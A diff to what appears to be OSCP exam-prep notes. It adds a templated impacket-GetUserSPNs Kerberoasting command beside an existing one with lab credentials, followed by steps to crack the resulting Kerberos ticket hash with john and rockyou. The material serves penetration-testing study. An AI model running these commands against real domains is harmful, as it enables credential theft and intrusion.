@@ -65,6 +65,10 @@ dv.paragraph("```bash\n" + command + "\n```");
 impacket-GetUserSPNs 'oscp.exam/Eric.Wallows:Password' -dc-ip 10.10.162.152 -request
 ```
 
+```
+impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN/USER
+```
+
 Paste the entire hash including $krb5tgs$23$ into hash.txt
 ```
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
